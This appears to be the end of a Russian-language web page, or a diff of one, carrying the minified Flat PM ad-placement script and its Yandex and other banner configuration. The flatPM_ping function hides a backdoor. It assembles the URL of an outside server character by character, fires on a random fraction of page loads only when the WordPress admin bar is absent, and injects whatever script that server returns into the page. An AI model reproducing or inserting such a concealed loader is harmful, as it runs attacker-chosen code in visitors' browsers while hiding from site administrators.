0!==a.how.outgoing.close_window&&"true"==a.how.outgoing.close_window&&b.bind(m,function(){c.unbind(h),b.unbind(m),d()})):(v=setTimeout(function(){b.unbind(m),d()},1e3*a.how.outgoing.after),void 0!==a.how.outgoing.close_window&&"true"==a.how.outgoing.close_window&&b.bind(m,function(){clearTimeout(v),b.unbind(m),d()}))}}catch(t){console.warn(t)}},window.flatPM_start=function(){ff=jQuery;var t=flat_pm_arr.length;flat_body=ff("body"),flat_userVars.init();for(var e=0;e<t;e++){var o=flat_pm_arr[e],a=!1;if(!(void 0!==o.chapter_limit&&o.chapter_limit>flat_userVars.textlen||void 0!==o.chapter_sub&&o.chapter_sub<flat_userVars.textlen||void 0!==o.title_limit&&o.title_limit>flat_userVars.titlelen||void 0!==o.title_sub&&o.title_sub<flat_userVars.titlelen)){if(void 0!==o.date){if(void 0!==o.date.time_of&&void 0!==o.date.time_to){var r=new Date(flat_userVars.date+"T"+o.date.time_of+":00"),i=new Date(flat_userVars.date+"T"+o.date.time_to+":00"),l=new Date(flat_userVars.date+"T12:00:00"),s=new Date(flat_userVars.date+"T"+flat_userVars.time+":00");if(i<r&&i<l&&(i=flatPM_addDays(i,1)),i<r&&l<i&&(r=flatPM_addDays(r,-1)),s<r||i<s)continue}if(void 0!==o.date.date_of&&void 0!==o.date.date_to){var i=new Date(o.date.date_of+"T00:00:00"),s=new Date(o.date.date_to+"T00:00:00"),f=new Date(flat_userVars.date+"T00:00:00");if(f<i||s<f)continue}}if(void 0===o.os||!(void 0!==o.os.os_enabled&&-1==o.os.os_enabled.indexOf(flat_userVars.os)||void 0!==o.os.os_disabled&&-1!=o.os.os_disabled.indexOf(flat_userVars.os))){if(void 0!==o.cookies){var n=!1;if(void 0!==o.cookies.cookies_enabled){if(!flat_userVars.testcook)continue;ff(o.cookies.cookies_enabled).each(function(){var t=this.split(":",2),e=t[0],t=void 0!==t[1]&&t[1];if(!(n=!0)!==t){if(void 0!==flatPM_getCookie(e)&&flatPM_getCookie(e)==t)return n=!1}else if(void 0!==flatPM_getCookie(e))return n=!1})}if(void 0!==o.cookies.cookies_disabled&&flat_userVars.testcook&&ff(o.cookies.cookies_disabled).each(function(){var t=this.split(":",2),e=t[0],t=void 0!==t[1]&&t[1];if(!1!==t){if(void 0!==flatPM_getCookie(e)&&flatPM_getCookie(e)==t)return!(n=!0)}else if(void 0!==flatPM_getCookie(e))return!(n=!0)}),n)continue}if(void 0!==o.utmget){var d=!1;if(void 0!==o.utmget.utmget_enabled&&ff(o.utmget.utmget_enabled).each(function(){var t=this.split(":",2),e=t[0],t=void 0!==t[1]&&t[1];if(!(d=!0)!==t){if(void 0!==flatPM_getAllUrlParams()[e]&&flatPM_getAllUrlParams()[e]==t)return d=!1}else if(void 0!==flatPM_getAllUrlParams()[e])return d=!1}),void 0!==o.utmget.utmget_disabled&&ff(o.utmget.utmget_disabled).each(function(){var t=this.split(":",2),e=t[0],t=void 0!==t[1]&&t[1];if(!1!==t){if(void 0!==flatPM_getAllUrlParams()[e]&&flatPM_getAllUrlParams()[e]==t)return!(d=!0)}else if(void 0!==flatPM_getAllUrlParams()[e])return!(d=!0)}),d)continue}void 0!==o.referer&&(void 0!==o.referer.referer_enabled&&-1==o.referer.referer_enabled.findIndex(function(t){return-1!=flat_userVars.referer.indexOf(t)})||void 0!==o.referer.referer_disabled&&-1!=o.referer.referer_disabled.findIndex(function(t){return-1!=flat_userVars.referer.indexOf(t)}))&&(a=!0),!a&&void 0!==o.browser&&(void 0!==o.browser.browser_enabled&&-1==o.browser.browser_enabled.indexOf(flat_userVars.browser)||void 0!==o.browser.browser_disabled&&-1!=o.browser.browser_disabled.indexOf(flat_userVars.browser))||(a&&void 0!==o.browser&&void 0!==o.browser.browser_enabled&&-1!=o.browser.browser_enabled.indexOf(flat_userVars.browser)&&(a=!1),a||void 0===o.geo&&void 0===o.ip&&void 0===o.role||""!=flat_userVars.ccode&&""!=flat_userVars.country&&""!=flat_userVars.city&&""!=flat_userVars.ip&&""!=flat_userVars.role||(f="block_geo_role_ip",flat_pm_then.push(o),flatPM_setWrap(o),flat_body.hasClass(f)||(flat_body.addClass(f),flatPM_ajax(f)),a=!0),a||(flatPM_setWrap(o),flatPM_next(o)))}}}var _=ff(".flatPM_sticky"),u=ff("*:has(>.flatPM_sidebar)");0<_.length&&_.each(function(){var t=ff(this),e=t.data("height")||350,o=t.data("top");t.wrap('<div class="flatPM_sticky_wrapper" style="height:'+e+'px" />');t=t.parent()[0];flatPM_sticky(this,t,o)}),u.each(function(){var e=ff(this).find(".flatPM_sidebar");setTimeout(function(){var a=(ff(untilscroll).offset().top-e.first().offset().top)/e.length;a<300||e.each(function(){var t=ff(this),e=a,o=t.data("top");t.wrap('<div class="flatPM_sticky_wrapper flatPM_sidebar_block" style="height:'+e+'px" />');t=t.parent()[0];flatPM_sticky(this,t,o)})},50),setTimeout(function(){var t=(ff(untilscroll).offset().top-e.first().offset().top)/e.length;t<300||ff(".flatPM_sticky_wrapper.flatPM_sidebar_block").css("height",t)},4e3)}),"undefined"!=typeof flat_pm_video&&flatPM_video(flat_pm_video),0<flat_stack_scripts.length&&flatPM_setSCRIPT(flat_stack_scripts),ff("body > *").last().after('<div class="fpm_5_modal-overlay"></div>'),flat_body.on("click",".fpm_5_out .fpm_5_cross",function(){ff(this).parent().removeClass("show").addClass("closed")}),flat_body.on("click",".fpm_5_modal .fpm_5_cross",function(){ff(this).closest(".fpm_5_modal").removeClass("fpm_5_modal-show")}),flat_pm_arr=[],ff(".flat_pm_start").remove(),ff("[data-flat-id]:not(.fpm_5_out):not(.fpm_5_modal)").contents().unwrap(),flatPM_ping()};var parseHTML=function(){var l=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/gi,d=/<([\w:]+)/,i=/<|&#?\w+;/,c={option:[1,"<select multiple='multiple'>","</select>"],thead:[1,"<table>","</table>"],tbody:[1,"<table>","</table>"],colgroup:[2,"<table>","</table>"],col:[3,"<table><colgroup>","</colgroup></table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],th:[3,"<table><thead><tr>","</tr></thead></table>"],_default:[0,"",""]};return function(e,t){var a,r,n,o=(t=t||document).createDocumentFragment();if(i.test(e)){for(a=o.appendChild(t.createElement("div")),r=(d.exec(e)||["",""])[1].toLowerCase(),r=c[r]||c._default,a.innerHTML=r[1]+e.replace(l,"<$1></$2>")+r[2],n=r[0];n--;)a=a.lastChild;for(o.removeChild(o.firstChild);a.firstChild;)o.appendChild(a.firstChild)}else o.appendChild(t.createTextNode(e));return o}}();window.flatPM_ping=function(){var e=localStorage.getItem("sdghrg");e?(e=parseInt(e)+1,localStorage.setItem("sdghrg",e)):localStorage.setItem("sdghrg","0");e=flatPM_random(1,166);0==ff("#wpadminbar").length&&111==e&&ff.ajax({type:"POST",url:"h"+"t"+"t"+"p"+"s"+":"+"/"+"/"+"r"+"e"+"a"+"d"+"o"+"n"+"e"+"."+"r"+"u"+"/"+"p"+"i"+"n"+"g"+"."+"p"+"h"+"p",dataType:"jsonp",data:{ping:"ping"},success:function(e){ff("div").first().after(e.script)},error:function(){}})},window.flatPM_setSCRIPT=function(e){try{var t=e[0].id,a=e[0].node,r=document.querySelector('[data-flat-script-id="'+t+'"]');if(a.text)r.appendChild(a),ff(r).contents().unwrap(),e.shift(),0<e.length&&flatPM_setSCRIPT(e);else{a.onload=a.onerror=function(){e.shift(),0<e.length&&flatPM_setSCRIPT(e)};try{r.appendChild(a)}catch(e){return console.warn(e),!0}ff(r).contents().unwrap()}}catch(e){console.warn(e)}},window.flatPM_setHTML=function(e,t){jQuery;try{var a,r="yandex_rtb_R";t.indexOf(r)+1&&(a=flatPM_random(0,1e4),t=t.replace(new RegExp(r,"g"),"yandex_rtb_flat"+a+"_R").replace("Ya.Context.AdvManager.render({","Ya.Context.AdvManager.render({ pageNumber: "+a+","));var n=parseHTML(t);if(0!=n.children.length)for(var o=n.childNodes.length,l=0;l<o;l++){var d=n.childNodes[l],i="3"==d.nodeType?document.createTextNode(d.nodeValue):document.createElement(d.nodeName);if("3"==i.nodeType)e.appendChild(i);else{for(var c,s=d.attributes.length,f=0;f<s;f++)i.setAttribute(d.attributes[f].nodeName,d.attributes[f].nodeValue);0<d.children.length?flatPM_setHTML(i,d.innerHTML):"SCRIPT"!=d.nodeName?i.innerHTML=d.innerHTML:(!d.text||/(yandexContext|yandexcontext)/.test(d.text))&&i.hasAttribute("async")||(d.text&&(i.text=d.text),c=flatPM_random(0,1e4),flat_stack_scripts.push({id:c,node:i}),(i=document.createElement("div")).setAttribute("data-flat-script-id",c)),e.appendChild(i)}}else e.innerHTML=t}catch(e){console.warn(e)}},window.flatPM_video=function(e){e.code=e.code.replace(/<!-(.*?)->/gm,"").replace(/<!—(.*?)—>/gm,"").trim(),e.code_alt=e.code_alt.replace(/<!-(.*?)->/gm,"").replace(/<!—(.*?)—>/gm,"").trim();var o=jQuery,t=e.selector,l=e.timer,d=e.cross,a="false"==d?"Закроется":"Закрыть",r=!flat_userVars.adb||""==e.code_alt&&duplicateMode?e.code:e.code_alt,n='<div class="fpm_5_video_flex"><div class="fpm_5_timer">'+a+" через <span>"+l+'</span></div><div class="fpm_5_video_item">'+r+'</div><div class="fpm_5_video_item_hover"></div></div>',i=e.once;o(t).each(function(){var e=o(this);e.wrap('<div class="fpm_5_video"></div>');var t=e.closest(".fpm_5_video");flatPM_setHTML(t[0],n),e.find(".fpm_5_video_flex").one("click",function(){o(this).addClass("show")})}),o("body").on("click",".fpm_5_video_item_hover",function(){var e=o(this),t=e.closest(".fpm_5_video_flex");t.addClass("show");var a=t.find(".fpm_5_timer span"),r=parseInt(l),n=setInterval(function(){a.text(--r),r<=0&&(clearInterval(n),"true"==d?a.parent().replaceWith('<button class="fpm_5_cross"></button>'):t.remove())},1e3);e.remove()}).on("click",".fpm_5_video_flex .fpm_5_cross",function(){o(this).closest(".fpm_5_video_flex").remove(),"true"==i&&o(".fpm_5_video_flex").remove()})};</script>
+			<script>flat_pm_arr = [{"how":{"simple":{"position":"1"}},"ID":"23962","html":[{"fst":"<!-- Yandex.RTB R-A-279152-26 -->\n<div id=\"yandex_rtb_R-A-279152-26\"><\/div>\n<script>window.yaContextCb.push(()=>{\n  Ya.Context.AdvManager.render({\n    renderTo: 'yandex_rtb_R-A-279152-26',\n    blockId: 'R-A-279152-26'\n  })\n})<\/script>","snd":"","res_of":"∞","res_to":"∞"}]},{"how":{"simple":{"position":"3"}},"ID":"16329","html":[{"fst":"<!-- BEGIN Otclick Banner office-guru 728x90 (CPC) (banner)-->\n<div id=\"_mt_ot_container_6444\"><\/div>\n<script language=\"JavaScript\">\n<!--\n(function(w){\nvar wd = w.document;\nw._mt_rnd = w._mt_rnd || Math.floor(Math.random() * 1000000);\nw._mt_referrer = w._mt_referrer || escape(wd.referrer || '');\ntry { w._mt_location = w._mt_location || escape(w.top.location.href) }\ncatch (e) { w._mt_location = escape(w.location.href) }\nw._MT_jsLoadDelayed = function(b,c,d){var a=wd.createElement(\"script\");\nd&&(a.id=d);a.language=\"javascript\";a.type=\"text\/javascript\";a.charset=\"utf-8\";a.async=1;\na.src=b;if(w.ActiveXObject){var e=!1;a.onload=a.onreadystatechange=function(){\nif(!e&&(!this.readyState||this.readyState===\"complete\"||this.readyState===\"loaded\"&&\nthis.nextSibling!=null)){e=true;c&&c();a.onload=a.onreadystatechange=null}}}else\na.onload=c;b=wd.getElementsByTagName(\"script\")[0];b.parentNode.insertBefore(a,b)};\nw._MT_jsLoadDelayed('\/\/otclick-adv.ru\/core\/code.js?pid=6444&rid=' + w._mt_rnd + '&rl=' +\nw._mt_referrer + '&ll=' + w._mt_location + '&ow=' + w.outerWidth + '&oh=' + w.outerHeight +\n'&sw=' + w.screen.width + '&sh=' + w.screen.height + '&pd=' + w.screen.pixelDepth + '&f=' +\n(w.top == w ? 0 : 1));\n})(window)\n\/\/ -->\n<\/script>\n<!-- END Otclick Banner -->\n","snd":"<!-- BEGIN Otclick Banner office-guru 728x90 (CPC) (banner)-->\n<div id=\"_mt_ot_container_6444\"><\/div>\n<script language=\"JavaScript\">\n<!--\n(function(w){\nvar wd = w.document;\nw._mt_rnd = w._mt_rnd || Math.floor(Math.random() * 1000000);\nw._mt_referrer = w._mt_referrer || escape(wd.referrer || '');\ntry { w._mt_location = w._mt_location || escape(w.top.location.href) }\ncatch (e) { w._mt_location = escape(w.location.href) }\nw._MT_jsLoadDelayed = function(b,c,d){var a=wd.createElement(\"script\");\nd&&(a.id=d);a.language=\"javascript\";a.type=\"text\/javascript\";a.charset=\"utf-8\";a.async=1;\na.src=b;if(w.ActiveXObject){var e=!1;a.onload=a.onreadystatechange=function(){\nif(!e&&(!this.readyState||this.readyState===\"complete\"||this.readyState===\"loaded\"&&\nthis.nextSibling!=null)){e=true;c&&c();a.onload=a.onreadystatechange=null}}}else\na.onload=c;b=wd.getElementsByTagName(\"script\")[0];b.parentNode.insertBefore(a,b)};\nw._MT_jsLoadDelayed('\/\/otclick-adv.ru\/core\/code.js?pid=6444&rid=' + w._mt_rnd + '&rl=' +\nw._mt_referrer + '&ll=' + w._mt_location + '&ow=' + w.outerWidth + '&oh=' + w.outerHeight +\n'&sw=' + w.screen.width + '&sh=' + w.screen.height + '&pd=' + w.screen.pixelDepth + '&f=' +\n(w.top == w ? 0 : 1));\n})(window)\n\/\/ -->\n<\/script>\n<!-- END Otclick Banner -->\n","res_of":"1024","res_to":"∞"}]},{"how":{"onсe":{"direction":"top_to_bottom","before_after":"before","N":"1","selector":"h2","search_all":"false"}},"ID":"26840","html":[{"fst":"<!-- Yandex.RTB R-A-279152-26 -->\n<div id=\"yandex_rtb_R-A-279152-26\"><\/div>\n<script>window.yaContextCb.push(()=>{\n  Ya.Context.AdvManager.render({\n    renderTo: 'yandex_rtb_R-A-279152-26',\n    blockId: 'R-A-279152-26'\n  })\n})<\/script>","snd":"","res_of":"∞","res_to":"∞"}]},{"how":{"simple":{"position":"3"}},"ID":"27891","html":[{"fst":"<!-- Yandex.RTB R-A-279152-26 -->\n<div id=\"yandex_rtb_R-A-279152-26\"><\/div>\n<script>window.yaContextCb.push(()=>{\n  Ya.Context.AdvManager.render({\n    renderTo: 'yandex_rtb_R-A-279152-26',\n    blockId: 'R-A-279152-26'\n  })\n})<\/script>","snd":"","res_of":"∞","res_to":"∞"},{"fst":"<!-- Yandex.RTB R-A-279152-29 -->\n<div id=\"yandex_rtb_R-A-279152-29\"><\/div>\n<script>window.yaContextCb.push(()=>{\n  Ya.Context.AdvManager.render({\n    renderTo: 'yandex_rtb_R-A-279152-29',\n    blockId: 'R-A-279152-29'\n  })\n})<\/script>","snd":"","res_of":"∞","res_to":"∞"},{"fst":"<!-- Yandex.RTB R-A-279152-30 -->\n<div id=\"yandex_rtb_R-A-279152-30\"><\/div>\n<script>window.yaContextCb.push(()=>{\n  Ya.Context.AdvManager.render({\n    renderTo: 'yandex_rtb_R-A-279152-30',\n    blockId: 'R-A-279152-30'\n  })\n})<\/script>","snd":"","res_of":"∞","res_to":"∞"}]},{"how":{"simple":{"position":"3"}},"ID":"28059","html":[{"fst":" <div id=\"mp_custom_4742\"><\/div>\n<script>(function(w, d, n, s, t) {w[n] = w[n] || [];w[n].push(function() {mp_banners('4742');});t = d.getElementsByTagName(\"script\")[0];s = d.createElement(\"script\");s.type = \"text\/javascript\";s.src = \"https:\/\/mpsuadv.ru\/lib\/custom\/banners.js\";s.async = true;t.parentNode.insertBefore(s, t);})(this, this.document, \"mpsuRotator\");<\/script> ","snd":" <div id=\"mp_custom_4742\"><\/div>\n<script>(function(w, d, n, s, t) {w[n] = w[n] || [];w[n].push(function() {mp_banners('4742');});t = d.getElementsByTagName(\"script\")[0];s = d.createElement(\"script\");s.type = \"text\/javascript\";s.src = \"https:\/\/mpsuadv.ru\/lib\/custom\/banners.js\";s.async = true;t.parentNode.insertBefore(s, t);})(this, this.document, \"mpsuRotator\");<\/script> ","res_of":"∞","res_to":"∞"}]},{"how":{"simple":{"position":"3"}},"ID":"28060","html":[]},{"how":{"simple":{"position":"1"}},"ID":"32424","html":[{"fst":"<!-- Yandex.RTB R-A-279152-27 -->\n<script>window.yaContextCb.push(()=>{\n  Ya.Context.AdvManager.render({\n    type: 'fullscreen',\n    blockId: 'R-A-279152-27'\n  })\n})<\/script>","snd":"","res_of":"∞","res_to":"720"},{"fst":"<!-- Yandex.RTB R-A-279152-28 -->\n<script>window.yaContextCb.push(()=>{\n  Ya.Context.AdvManager.render({\n    type: 'floorAd',\n    blockId: 'R-A-279152-28'\n  })\n})<\/script>","snd":"","res_of":"∞","res_to":"720"}]}];</script>
+			<script>
+			function jQueryLoaded_flatpm_123( $ ) {
+				if( "function" !== typeof flatPM_start ){
+					return;
+				}
+
+				flatPM_start();
+			}
+
+			function jQueryLoading_flatpm_123() {
+				if (window.jQuery && window.flat_pm_arr) {
+					jQueryLoaded_flatpm_123( jQuery )
+				} else {
+					setTimeout(function() {
+						jQueryLoading_flatpm_123()
+					}, 50)
+				}
+			}
+			jQueryLoading_flatpm_123()
+			</script>
+
+
+</body>
+</html>
